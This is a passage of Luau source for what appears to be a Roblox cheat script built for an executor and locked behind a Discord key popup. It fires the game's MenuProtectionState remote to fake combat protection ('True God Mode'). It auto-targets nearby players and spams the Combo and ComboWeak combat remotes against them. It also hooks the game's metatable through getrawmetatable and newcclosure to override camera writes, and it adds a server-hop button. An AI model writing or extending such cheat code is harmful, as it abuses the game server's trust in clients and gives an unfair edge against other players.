	if not real then status.Text = "Cannot reach" status.TextColor3 = Color3.fromRGB(255,80,80) return end
	if input == real then
	pcall(function() if writefile then writefile(KEY_FILE, input) end end)
	keyUnlocked = true
	status.Text = "Unlocked"
	status.TextColor3 = Color3.fromRGB(80,220,120)
	for _, d in ipairs(game:GetDescendants()) do
	if d.Name == "KeyCover" then pcall(function() d:Destroy() end) end
	end
	task.delay(0.4, function() if gui and gui.Parent then gui:Destroy() end keyPopup = nil end)
	else
	status.Text = "Wrong key"
	status.TextColor3 = Color3.fromRGB(255,80,80)
	end
	end)
	end
	if not keyUnlocked then
	task.spawn(function()
	local names = {"GiveGodModeBtn","NoRespawnTrollBtn","LockCamWobbleBtn","TrueGodModeBtn","SnitchRadarBtn"}
	for _ = 1, 30 do
	if keyUnlocked then break end
	for _, n in ipairs(names) do
	for _, d in ipairs(game:GetDescendants()) do
	if d.Name == n and d:IsA("TextButton") and not d:FindFirstChild("KeyCover") then
	local cover = Instance.new("TextButton")
	cover.Name = "KeyCover"
	cover.Size = UDim2.new(1,0,1,0)
	cover.BackgroundColor3 = Color3.fromRGB(20,20,24)
	cover.BackgroundTransparency = 0.45
	cover.Text = "Join DC"
	cover.TextColor3 = Color3.fromRGB(200,200,200)
	cover.Font = Enum.Font.GothamBold
	cover.TextSize = 11
	cover.ZIndex = (d.ZIndex or 1) + 10
	cover.Parent = d
	Instance.new("UICorner", cover).CornerRadius = UDim.new(0,4)
	cover.MouseButton1Click:Connect(function()
	if not keyUnlocked then showKeyPopup() end
	end)
	end
	end
	end
	task.wait(0.5)
	end
	end)
	end
	if not SettingsContent then
	return
	end
	SettingsContent.Size = UDim2.new(1, -10, 0, 140)
	if SliderTrack and not SliderTrack:FindFirstChild("ScaleTick100") then
	local tick = Instance.new("Frame")
	tick.Name = "ScaleTick100"
	tick.Size = UDim2.new(0, 2, 1, 4)
	tick.Position = UDim2.new(0.5, -1, 0, -2)
	tick.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
	tick.BackgroundTransparency = 0.45
	tick.BorderSizePixel = 0
	tick.ZIndex = 3
	tick.Parent = SliderTrack
	end
	if SettingsContent:FindFirstChild("UiScaleSave") then
	SettingsContent:FindFirstChild("UiScaleSave"):Destroy()
	end
	if CancelScriptBtn then
	CancelScriptBtn.Position = UDim2.new(0, 5, 0, 86)
	end
	local saveUi = Instance.new("TextButton")
	saveUi.Name = "UiScaleSave"
	saveUi.Size = UDim2.new(1, -10, 0, 22)
	saveUi.Position = UDim2.new(0, 5, 0, 58)
	saveUi.BackgroundColor3 = Color3.fromRGB(40, 90, 50)
	saveUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	saveUi.Font = Enum.Font.GothamBold
	saveUi.TextSize = 11
	saveUi.Text = "Save UI Size"
	saveUi.Parent = SettingsContent
	local saveUiC = Instance.new("UICorner")
	saveUiC.CornerRadius = UDim.new(0, 4)
	saveUiC.Parent = saveUi
	do
	local raw = ""
	pcall(function()
	if isfile and isfile("yyds_uiscale_dev_v5.txt") then
	raw = tostring(readfile("yyds_uiscale_dev_v5.txt") or "")
	end
	end)
	local n = tonumber(raw)
	if n then
	if UpdateFromScale then
	UpdateFromScale(n)
	elseif uiScale then
	uiScale.Scale = n
	end
	end
	end
	saveUi.MouseButton1Click:Connect(function()
	local n = 1
	if uiScale then
	n = tonumber(uiScale.Scale) or 1
	end
	pcall(function()
	writefile("yyds_uiscale_dev_v5.txt", tostring(n))
	end)
	saveUi.Text = "Saved"
	task.delay(0.4, function()
	saveUi.Text = "Save UI Size"
	end)
	end)
	end
end)
task.spawn(function()
	local ex2 = Instance.new("TextButton")
	ex2.Name = "EX2_Button"
	ex2.Size = UDim2.new(0.25, -2, 1, -4)
	ex2.Position = UDim2.new(0.75, 0, 0, 2)
	ex2.BackgroundColor3 = Color3.fromRGB(35, 30, 50)
	ex2.BackgroundTransparency = 0.4
	ex2.TextColor3 = Color3.fromRGB(160, 150, 180)
	ex2.Font = Enum.Font.GothamBold
	ex2.TextSize = 10
	ex2.Text = "EX 2"
	ex2.Visible = false
	ex2.Parent = TabContainer
	local ex2c = Instance.new("UICorner")
	ex2c.CornerRadius = UDim.new(0, 4)
	ex2c.Parent = ex2
	local page = Instance.new("Frame")
	page.Name = "ExtrasPage_2"
	page.Size = Page2.Size
	page.Position = Page2.Position
	page.BackgroundTransparency = 1
	page.BorderSizePixel = 0
	page.ClipsDescendants = true
	page.ZIndex = 2
	page.Visible = false
	page.Parent = Main
	local scroll = Instance.new("ScrollingFrame")
	scroll.Name = "ExtrasPage_2Scroll"
	scroll.Size = UDim2.new(1, 0, 1, 0)
	scroll.BackgroundTransparency = 1
	scroll.BorderSizePixel = 0
	scroll.ScrollBarThickness = 4
	scroll.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 120)
	scroll.CanvasSize = UDim2.new(0, 0, 0, 420)
	scroll.ScrollingEnabled = true
	scroll.Parent = page
	task.delay(0.3, function()
	local godBtn = Page2Scroll and Page2Scroll:FindFirstChild("GiveGodModeBtn", true)
	local godPage = Page2 and Page2:FindFirstChild("GiveGodModePage")
	if godBtn then
	godBtn.Parent = scroll
	godBtn.Position = UDim2.new(0, 5, 0, 10)
	godBtn.Size = UDim2.new(1, -10, 0, 24)
	godBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	godBtn.TextSize = 11
	godBtn.ZIndex = 3
	godBtn.Visible = true
	end
	if godPage then
	godPage.Parent = Main
	godPage.Position = Page2.Position
	godPage.Size = Page2.Size
	godPage.BackgroundTransparency = 0
	godPage.Active = true
	godPage.ZIndex = 20
	local godCatch = godPage:FindFirstChild("Catch")
	if not godCatch then
	godCatch = Instance.new("TextButton")
	godCatch.Name = "Catch"
	godCatch.Size = UDim2.new(1, 0, 1, 0)
	godCatch.BackgroundTransparency = 1
	godCatch.Text = ""
	godCatch.AutoButtonColor = false
	godCatch.Active = true
	godCatch.ZIndex = 1
	godCatch.Parent = godPage
	end
	end
	if godBtn then
	godBtn.ZIndex = 7
	end
	local trollBtn = Page2Scroll and Page2Scroll:FindFirstChild("ModeTrollBtn")
	if trollBtn then trollBtn:Destroy() end
	local trollPage = Page2Scroll and Page2Scroll:FindFirstChild("ModeTrollPage")
	if trollPage then trollPage:Destroy() end
	local nrBtn = Instance.new("TextButton")
	nrBtn.Name = "NoRespawnTrollBtn"
	nrBtn.Size = UDim2.new(1, -10, 0, 24)
	nrBtn.Position = UDim2.new(0, 5, 0, 40)
	nrBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	nrBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	nrBtn.Font = Enum.Font.GothamBold
	nrBtn.TextSize = 11
	nrBtn.Text = "No Respawn Troll"
	nrBtn.ZIndex = 3
	nrBtn.Parent = scroll
	local nrC = Instance.new("UICorner")
	nrC.CornerRadius = UDim.new(0, 4)
	nrC.Parent = nrBtn
	local lcBtn = Instance.new("TextButton")
	lcBtn.Name = "LockCamWobbleBtn"
	lcBtn.Size = UDim2.new(1, -10, 0, 24)
	lcBtn.Position = UDim2.new(0, 5, 0, 70)
	lcBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	lcBtn.TextColor3 = Color3.fromRGB(255, 240, 220)
	lcBtn.Font = Enum.Font.GothamBold
	lcBtn.TextSize = 11
	lcBtn.TextScaled = true
	lcBtn.TextWrapped = true
	lcBtn.Text = "Lock camWobble"
	lcBtn.ZIndex = 3
	lcBtn.Parent = scroll
	local lcC = Instance.new("UICorner")
	lcC.CornerRadius = UDim.new(0, 4)
	lcC.Parent = lcBtn
	local trueGod = Instance.new("TextButton")
	trueGod.Name = "TrueGodModeBtn"
	trueGod.Size = UDim2.new(1, -10, 0, 24)
	trueGod.Position = UDim2.new(0, 5, 0, 104)
	trueGod.BackgroundColor3 = Color3.fromRGB(200, 160, 20)
	trueGod.TextColor3 = Color3.fromRGB(20, 20, 20)
	trueGod.Font = Enum.Font.GothamBold
	trueGod.TextSize = 11
	trueGod.Text = "True God Mode"
	trueGod.ZIndex = 3
	trueGod.Parent = scroll
	local trueGodC = Instance.new("UICorner")
	trueGodC.CornerRadius = UDim.new(0, 4)
	trueGodC.Parent = trueGod
	trueGod.MouseButton1Click:Connect(function()
	local g = getgenv()
	g._YYDSGod = g._YYDSGod or {}
	local st = g._YYDSGod
	local menuRemote = nil
	for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("RemoteEvent") and obj.Name == "MenuProtectionState" then
	menuRemote = obj
	break
	end
	end
	if menuRemote then
	pcall(function() menuRemote:FireServer(true) end)
	end
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not hum or not root then return end
	if st.render then st.render:Disconnect() end
	if st.speed then st.speed:Disconnect() end
	if st.died then st.died:Disconnect() end
	st.on = true
	st.saved = hum.AutoRotate
	hum.WalkSpeed = 25
	hum.AutoRotate = false
	hum.CameraOffset = Vector3.new(0, 0, 0)
	pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
	trueGod.Text = "✓"
	task.delay(0.6, function()
	if trueGod then trueGod.Text = "True God Mode" end
	end)
	st.render = RunService.RenderStepped:Connect(function()
	if not st.on then return end
	local c = LocalPlayer.Character
	local h = c and c:FindFirstChildOfClass("Humanoid")
	local r = c and c:FindFirstChild("HumanoidRootPart")
	if not r then return end
	if h and h.AutoRotate then h.AutoRotate = false end
	local cam = workspace.CurrentCamera
	if not cam then return end
	local look = cam.CFrame.LookVector
	local yaw = math.atan2(-look.X, -look.Z)
	r.CFrame = CFrame.new(r.Position) * CFrame.Angles(0, yaw, 0)
	end)
	st.speed = RunService.Heartbeat:Connect(function()
	if not st.on then return end
	local c = LocalPlayer.Character
	local h = c and c:FindFirstChildOfClass("Humanoid")
	if h and h.WalkSpeed ~= 25 then h.WalkSpeed = 25 end
	end)
	st.died = hum.Died:Connect(function()
	st.on = false
	if st.render then st.render:Disconnect() st.render = nil end
	if st.speed then st.speed:Disconnect() st.speed = nil end
	local c2 = LocalPlayer.Character
	local h2 = c2 and c2:FindFirstChildOfClass("Humanoid")
	if h2 then
	h2.AutoRotate = st.saved
	h2.CameraOffset = Vector3.new(0, 0, 0)
	h2.WalkSpeed = 16
	end
	pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
	end)
	if not st.respawn then
	st.respawn = LocalPlayer.CharacterAdded:Connect(function()
	task.wait(0.5)
	st.on = false
	if st.render then st.render:Disconnect() st.render = nil end
	if st.speed then st.speed:Disconnect() st.speed = nil end
	pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
	end)
	end
	end)
	local setBtn = Instance.new("TextButton")
	setBtn.Name = "ExSettingsBtn"
	setBtn.Size = UDim2.new(1, -10, 0, 24)
	setBtn.Position = UDim2.new(0, 5, 0, 138)
	setBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	setBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	setBtn.Font = Enum.Font.GothamBold
	setBtn.TextSize = 11
	setBtn.Text = "👤Settings"
	setBtn.ZIndex = 3
	setBtn.Parent = Page2Scroll
	setBtn.Position = UDim2.new(0, 5, 0, 402)
	setBtn.Size = UDim2.new(1, -10, 0, 24)
	local hopBtn = Instance.new("TextButton")
	hopBtn.Name = "SwitchServerBtn"
	hopBtn.Size = UDim2.new(1, -10, 0, 24)
	hopBtn.Position = UDim2.new(0, 5, 0, 464)
	hopBtn.BackgroundColor3 = Color3.fromRGB(160, 40, 40)
	hopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	hopBtn.Font = Enum.Font.GothamBold
	hopBtn.TextSize = 11
	hopBtn.Text = "🔄 Switch Server"
	hopBtn.ZIndex = 3
	hopBtn.Parent = Page2Scroll
	local hopC = Instance.new("UICorner")
	hopC.CornerRadius = UDim.new(0, 4)
	hopC.Parent = hopBtn
	local hopArmed = false
	local hopToken = 0
	local hopBusy = false
	hopBtn.MouseButton1Click:Connect(function()
	if hopBusy then return end
	if not hopArmed then
	hopArmed = true
	hopToken = hopToken + 1
	local tok = hopToken
	hopBtn.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	task.spawn(function()
	for i = 5, 1, -1 do
	if hopToken ~= tok or not hopArmed then return end
	hopBtn.Text = "🔄 Confirm " .. tostring(i)
	task.wait(1)
	end
	if hopToken ~= tok then return end
	hopArmed = false
	hopBtn.Text = "🔄 Switch Server"
	hopBtn.BackgroundColor3 = Color3.fromRGB(160, 40, 40)
	end)
	return
	end
	hopArmed = false
	hopToken = hopToken + 1
	hopBusy = true
	hopBtn.Text = "🔄 Switching..."
	hopBtn.BackgroundColor3 = Color3.fromRGB(90, 20, 20)
	task.spawn(function()
	local placeId = game.PlaceId
	local jobId = game.JobId
	local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", placeId)
	local ok, resp = pcall(function()
	return game:HttpGet(url, true)
	end)
	local picked = nil
	if ok and resp then
	local ok2, data = pcall(function()
	return game:GetService("HttpService"):JSONDecode(resp)
	end)
	if ok2 and data and data.data then
	local others = {}
	for _, server in ipairs(data.data) do
	if server.id ~= jobId and server.playing and server.maxPlayers and server.playing < server.maxPlayers then
	table.insert(others, server.id)
	end
	end
	if #others > 0 then
	picked = others[math.random(1, #others)]
	end
	end
	end
	if picked then
	pcall(function()
	game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, picked, LocalPlayer)
	end)
	else
	pcall(function()
	game:GetService("TeleportService"):Teleport(placeId, LocalPlayer)
	end)
	end
	task.wait(3)
	hopBusy = false
	hopBtn.Text = "🔄 Switch Server"
	hopBtn.BackgroundColor3 = Color3.fromRGB(160, 40, 40)
	end)
	end)
	local bug = Page2Scroll:FindFirstChild("BugOrSuggestions")
	local fbox = Page2Scroll:FindFirstChild("FeedbackBox")
	local fsend = Page2Scroll:FindFirstChild("FeedbackSend")
	local fnote = Page2Scroll:FindFirstChild("FeedbackNote")
	local dtitle = Page2Scroll:FindFirstChild("DiscordTitle")
	local dlink = Page2Scroll:FindFirstChild("DiscordLink")
	local dcopy = Page2Scroll:FindFirstChild("DiscordCopy")
	if bug then
	bug.Parent = scroll
	bug.Position = UDim2.new(0, 5, 0, 168)
	end
	if fbox then
	fbox.Parent = scroll
	fbox.Position = UDim2.new(0, 10, 0, 186)
	end
	if fsend then
	fsend.Parent = scroll
	fsend.Position = UDim2.new(0, 10, 0, 216)
	end
	if fnote then
	fnote.Parent = scroll
	fnote.Position = UDim2.new(0, 8, 0, 216)
	end
	if dtitle then
	dtitle.Parent = scroll
	dtitle.Position = UDim2.new(0, 5, 0, 244)
	end
	if dlink then
	dlink.Parent = scroll
	dlink.Position = UDim2.new(0, 5, 0, 262)
	end
	if dcopy then
	dcopy.Parent = scroll
	dcopy.Position = UDim2.new(1, -27, 0, 262)
	end
	if SettingsFoldBtn then
	SettingsFoldBtn.Parent = scroll
	SettingsFoldBtn.Position = UDim2.new(0, 5, 0, 294)
	end
	if SettingsContent then
	SettingsContent.Parent = scroll
	SettingsContent.Position = UDim2.new(0, 5, 0, 320)
	end
	if Page2Credit then
	Page2Credit.Parent = scroll
	Page2Credit.Position = UDim2.new(0, 2, 0, 326)
	end
	if Page2Warn then
	Page2Warn.Parent = scroll
	Page2Warn.Position = UDim2.new(0, 5, 0, 450)
	end
	scroll.CanvasSize = UDim2.new(0, 0, 0, 550)
	local setC = Instance.new("UICorner")
	setC.CornerRadius = UDim.new(0, 4)
	setC.Parent = setBtn
	local setPage = Instance.new("Frame")
	setPage.Name = "ExSettingsPage"
	setPage.Size = Page2.Size
	setPage.Position = Page2.Position
	setPage.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	setPage.BorderSizePixel = 0
	setPage.Active = true
	setPage.Visible = false
	setPage.ZIndex = 8
	setPage.Parent = Main
	local setBack = Instance.new("TextButton")
	setBack.Size = UDim2.new(0, 46, 0, 46)
	setBack.Position = UDim2.new(0, 6, 0, 6)
	setBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	setBack.TextColor3 = Color3.fromRGB(255, 255, 255)
	setBack.Font = Enum.Font.GothamBold
	setBack.TextSize = 11
	setBack.Text = "Back"
	setBack.ZIndex = 10
	setBack.Parent = setPage
	local setBackC = Instance.new("UICorner")
	setBackC.CornerRadius = UDim.new(0, 4)
	setBackC.Parent = setBack
	local setTitle = Instance.new("TextLabel")
	setTitle.Size = UDim2.new(1, -60, 0, 18)
	setTitle.Position = UDim2.new(0, 56, 0, 16)
	setTitle.BackgroundTransparency = 1
	setTitle.Font = Enum.Font.GothamBold
	setTitle.TextSize = 12
	setTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	setTitle.TextXAlignment = Enum.TextXAlignment.Left
	setTitle.Text = "Settings"
	setTitle.ZIndex = 10
	setTitle.Parent = setPage
	local shakeBtn = Instance.new("TextButton")
	shakeBtn.Name = "DisableCameraShake"
	shakeBtn.Size = UDim2.new(1, -12, 0, 24)
	shakeBtn.Position = UDim2.new(0, 6, 0, 150)
	shakeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	shakeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	shakeBtn.Font = Enum.Font.GothamBold
	shakeBtn.TextSize = 11
	shakeBtn.Text = "disableCameraShake"
	shakeBtn.ZIndex = 10
	shakeBtn.Parent = setPage
	local shakeC = Instance.new("UICorner")
	shakeC.CornerRadius = UDim.new(0, 4)
	shakeC.Parent = shakeBtn
	local m1Btn = Instance.new("TextButton")
	m1Btn.Name = "InfM1Btn"
	m1Btn.Size = UDim2.new(1, -12, 0, 24)
	m1Btn.Position = UDim2.new(0, 6, 0, 180)
	m1Btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	m1Btn.TextColor3 = Color3.fromRGB(230, 230, 230)
	m1Btn.Font = Enum.Font.GothamBold
	m1Btn.TextSize = 11
	m1Btn.Text = "inf M1"
	m1Btn.ZIndex = 10
	m1Btn.Visible = LocalPlayer:GetAttribute("YYDSPC") ~= true
	m1Btn.Parent = setPage
	local m1C = Instance.new("UICorner")
	m1C.CornerRadius = UDim.new(0, 4)
	m1C.Parent = m1Btn
	local m1On = false
	local m1Gui = Instance.new("ScreenGui")
	m1Gui.Name = "M1BallFinal"
	m1Gui.ResetOnSpawn = false
	m1Gui.IgnoreGuiInset = true
	m1Gui.DisplayOrder = 99999
	m1Gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
	local m1Ball = Instance.new("TextButton")
	m1Ball.Name = "M1Ball"
	m1Ball.Size = UDim2.new(0, 48, 0, 48)
	m1Ball.Position = UDim2.new(0, 594, 0, 124)
	m1Ball.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	m1Ball.TextColor3 = Color3.fromRGB(255, 255, 255)
	m1Ball.Font = Enum.Font.GothamBold
	m1Ball.TextSize = 14
	m1Ball.Text = "Combat"
	m1Ball.TextWrapped = true
	m1Ball.AutoButtonColor = false
	m1Ball.Active = false
	m1Ball.Visible = false
	m1Ball.Parent = m1Gui
	Instance.new("UICorner", m1Ball).CornerRadius = UDim.new(1, 0)
	local m1Last = 0
	local m1Cd = 0.5
	local m1Step = 0
	local m1Miss = false
	local m1Dash = false
	m1Ball.MouseButton1Click:Connect(function()
	if not m1On then return end
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local combat = chars and chars:FindFirstChild("Combat")
	local rem = combat and combat:FindFirstChild("Remotes")
	local combo = rem and rem:FindFirstChild("Combo")
	local weak = rem and rem:FindFirstChild("ComboWeak")
	local ch = LocalPlayer.Character
	local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
	local target = nil
	local bestD = math.huge
	if hrp then
	local origin = hrp.Position
	local direction = hrp.CFrame.LookVector
	local centerPos = origin + direction * 4.5
	local boxCF = CFrame.lookAt(centerPos, centerPos + direction)
	local half = Vector3.new(4, 3, 4.5)
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	if h and h.Health > 0 and r then
	local lp = boxCF:PointToObjectSpace(r.Position)
	if math.abs(lp.X) <= half.X and math.abs(lp.Y) <= half.Y and math.abs(lp.Z) <= half.Z then
	local d = (r.Position - hrp.Position).Magnitude
	if d < bestD then
	target = plr
	bestD = d
	end
	end
	end
	end
	end
	end
	local now = tick()
	if m1Last > 0 and (now - m1Last) < m1Cd then
	if not (m1Miss and target) then return end
	m1Step = 0
	end
	if m1Last > 0 and (now - m1Last) > (m1Cd + 0.8) then
	m1Step = 0
	end
	local anims = {"9759925585", "9759929844", "9759932239"}
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	local an = hum and (hum:FindFirstChildOfClass("Animator") or hum)
	if not target then
	m1Step = 0
	m1Last = now
	m1Cd = 0.5
	m1Miss = true
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://" .. anims[1]
	local ok, tr = pcall(function() return an:LoadAnimation(a) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play(0.05)
	end
	end
	return
	end
	m1Step = m1Step + 1
	if m1Step > 3 then m1Step = 1 end
	m1Last = now
	m1Cd = 0.35
	m1Miss = false
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://" .. anims[m1Step]
	local ok, tr = pcall(function() return an:LoadAnimation(a) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play(0.05)
	end
	end
	if hrp and target.Character and not m1Dash then
	local tHrp = target.Character:FindFirstChild("HumanoidRootPart")
	if tHrp then
	local diff = tHrp.Position - hrp.Position
	local flat = Vector3.new(diff.X, 0, diff.Z)
	local dist = flat.Magnitude
	if dist > 1.4 then
	local dashDist = math.min(dist - 1.2, 2)
	if dashDist > 0.05 then
	m1Dash = true
	local dir = flat.Unit
	local startPos = hrp.Position
	local endPos = startPos + dir * dashDist
	task.spawn(function()
	local t = 0
	while t < 0.12 do
	local dt = RunService.Heartbeat:Wait()
	t = t + dt
	local alpha = math.min(t / 0.12, 1)
	local ease = 1 - (1 - alpha) * (1 - alpha)
	local np = startPos:Lerp(endPos, ease)
	if hrp and hrp.Parent then
	hrp.CFrame = CFrame.new(np, np + hrp.CFrame.LookVector)
	end
	end
	m1Dash = false
	end)
	end
	end
	end
	end
	if combo and weak then
	pcall(function()
	combo:FireServer(target.DisplayName)
	combo:FireServer(target.Name)
	combo:FireServer(target.Character)
	weak:FireServer(target.DisplayName)
	weak:FireServer(target.Name)
	weak:FireServer(target.Character)
	end)
	end
	end)
	RunService.RenderStepped:Connect(function()
	if not m1On then return end
	local ms = LocalPlayer.PlayerGui:FindFirstChild("Moveset")
	local native = ms and ms:FindFirstChild("M1Button", true)
	if not native then
	m1Ball.Position = UDim2.new(0, 594, 0, 124)
	return
	end
	local ap = native.AbsolutePosition
	local as_ = native.AbsoluteSize
	local cx = ap.X + as_.X / 2
	local yAdjust = 0
	if cx < 610 then yAdjust = 8 end
	m1Ball.Position = UDim2.new(0, cx - 24, 0, 124 + yAdjust)
	end)
	LocalPlayer:GetAttributeChangedSignal("YYDSPC"):Connect(function()
	local mobile = LocalPlayer:GetAttribute("YYDSPC") ~= true
	m1Btn.Visible = mobile
	if not mobile and m1On then
	m1On = false
	m1Ball.Visible = false
	m1Ball.Active = false
	m1Btn.Text = "inf M1"
	m1Btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	end
	end)
	m1Btn.MouseButton1Click:Connect(function()
	if LocalPlayer:GetAttribute("YYDSPC") == true then return end
	m1On = not m1On
	m1Ball.Visible = m1On
	m1Ball.Active = m1On
	if m1On then
	m1Btn.Text = "inf M1 ON"
	m1Btn.BackgroundColor3 = Color3.fromRGB(40, 140, 70)
	else
	m1Btn.Text = "inf M1"
	m1Btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	end
	end)
	local shakeOn = false
	local shakeConns = {}
	local shakeMt, shakeOld
	local shakeBypass = false
	local function stopShake()
	shakeOn = false
	for _, c in ipairs(shakeConns) do pcall(function() c:Disconnect() end) end
	shakeConns = {}
	if shakeMt and shakeOld then
	pcall(function()
	if setreadonly then setreadonly(shakeMt, false) end
	shakeMt.__newindex = shakeOld
	if setreadonly then setreadonly(shakeMt, true) end
	end)
	end
	shakeMt = nil
	shakeOld = nil
	shakeBtn.Text = "disableCameraShake"
	shakeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	end
	shakeBtn.MouseButton1Click:Connect(function()
	if shakeOn then
	stopShake()
	return
	end
	shakeOn = true
	shakeBtn.Text = "Active"
	shakeBtn.BackgroundColor3 = Color3.fromRGB(30, 90, 45)
	local cam = workspace.CurrentCamera
	pcall(function()
	cam.CameraType = Enum.CameraType.Custom
	cam.FieldOfView = 70
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if hum then cam.CameraSubject = hum end
	end)
	pcall(function()
	shakeMt = getrawmetatable(game)
	shakeOld = shakeMt.__newindex
	if setreadonly then setreadonly(shakeMt, false) end
	local oldNewIndex = shakeOld
	local hook = function(self, key, value)
	if shakeOn and self == cam then
	if key == "CameraType" and value ~= Enum.CameraType.Custom then return end
	if key == "CFrame" or key == "Focus" then
	local caller = nil
	pcall(function() caller = getcallingscript() end)
	local n = caller and caller:GetFullName() or ""
	if string.find(n, "PlayerModule") or string.find(n, "CameraModule") or string.find(n, "CameraScript") or string.find(n, "ControlModule") then
	return oldNewIndex(self, key, value)
	end
	return
	end
	if key == "FieldOfView" then
	if shakeBypass then return oldNewIndex(self, key, value) end
	return
	end
	if key == "CameraSubject" then
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if value == h then return oldNewIndex(self, key, value) end
	return
	end
	end
	if shakeOn and key == "CameraOffset" and typeof(self) == "Instance" and self:IsA("Humanoid") then
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if self == h then return end
	end
	return oldNewIndex(self, key, value)
	end
	if newcclosure then hook = newcclosure(hook) end
	shakeMt.__newindex = hook
	if setreadonly then setreadonly(shakeMt, true) end
	end)
	table.insert(shakeConns, cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
	if not shakeOn or shakeBypass then return end
	if math.abs(cam.FieldOfView - 70) > 0.01 then
	shakeBypass = true
	pcall(function() cam.FieldOfView = 70 end)
	shakeBypass = false
	end
	end))
	table.insert(shakeConns, RunService.RenderStepped:Connect(function()
	if not shakeOn then return end
	if math.abs(cam.FieldOfView - 70) > 0.01 then
	shakeBypass = true
	pcall(function() cam.FieldOfView = 70 end)
	shakeBypass = false
	end
	if cam.CameraType ~= Enum.CameraType.Custom then
	pcall(function() cam.CameraType = Enum.CameraType.Custom end)
	end
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h and cam.CameraSubject ~= h then
	pcall(function() cam.CameraSubject = h end)
	end
	end))
	end)
	local swCur = Instance.new("TextLabel")
	swCur.Size = UDim2.new(1, -12, 0, 18)
	swCur.Position = UDim2.new(0, 6, 0, 86)
	swCur.BackgroundColor3 = Color3.fromRGB(20, 26, 32)
	swCur.TextColor3 = Color3.fromRGB(180, 180, 180)
	swCur.Font = Enum.Font.GothamBold
	swCur.TextSize = 10
	swCur.TextXAlignment = Enum.TextXAlignment.Left
	swCur.Text = "  Current: -"
	swCur.ZIndex = 10
	swCur.Parent = setPage
	local swCurC = Instance.new("UICorner")
	swCurC.CornerRadius = UDim.new(0, 4)
	swCurC.Parent = swCur
	local swName = Instance.new("TextLabel")
	swName.Size = UDim2.new(1, -40, 0, 24)
	swName.Position = UDim2.new(0, 6, 0, 58)
	swName.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	swName.TextColor3 = Color3.fromRGB(230, 230, 230)
	swName.Font = Enum.Font.GothamBold
	swName.TextSize = 11
	swName.TextXAlignment = Enum.TextXAlignment.Left
	swName.Text = "  Select character"
	swName.ZIndex = 10
	swName.Parent = setPage
	local swNameC = Instance.new("UICorner")
	swNameC.CornerRadius = UDim.new(0, 4)
	swNameC.Parent = swName
	local swArr = Instance.new("TextButton")
	swArr.Size = UDim2.new(0, 28, 0, 24)
	swArr.Position = UDim2.new(1, -34, 0, 58)
	swArr.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	swArr.TextColor3 = Color3.fromRGB(230, 230, 230)
	swArr.Font = Enum.Font.GothamBold
	swArr.TextSize = 12
	swArr.Text = "v"
	swArr.ZIndex = 11
	swArr.Parent = setPage
	local swArrC = Instance.new("UICorner")
	swArrC.CornerRadius = UDim.new(0, 4)
	swArrC.Parent = swArr
	local swStat = Instance.new("TextLabel")
	swStat.Size = UDim2.new(1, -12, 0, 16)
	swStat.Position = UDim2.new(0, 6, 0, 106)
	swStat.BackgroundTransparency = 1
	swStat.TextColor3 = Color3.fromRGB(140, 140, 140)
	swStat.Font = Enum.Font.Gotham
	swStat.TextSize = 9
	swStat.TextXAlignment = Enum.TextXAlignment.Left
	swStat.Text = "  Ready"
	swStat.ZIndex = 10
	swStat.Parent = setPage
	local swDrop = Instance.new("ScrollingFrame")
	swDrop.Size = UDim2.new(1, -12, 0, 175)
	swDrop.Position = UDim2.new(0, 6, 0, 126)
	swDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	swDrop.BorderSizePixel = 0
	swDrop.ScrollBarThickness = 3
	swDrop.Visible = false
	swDrop.ZIndex = 12
	swDrop.CanvasSize = UDim2.new(0, 0, 0, 0)
	swDrop.Parent = setPage
	local swDropC = Instance.new("UICorner")
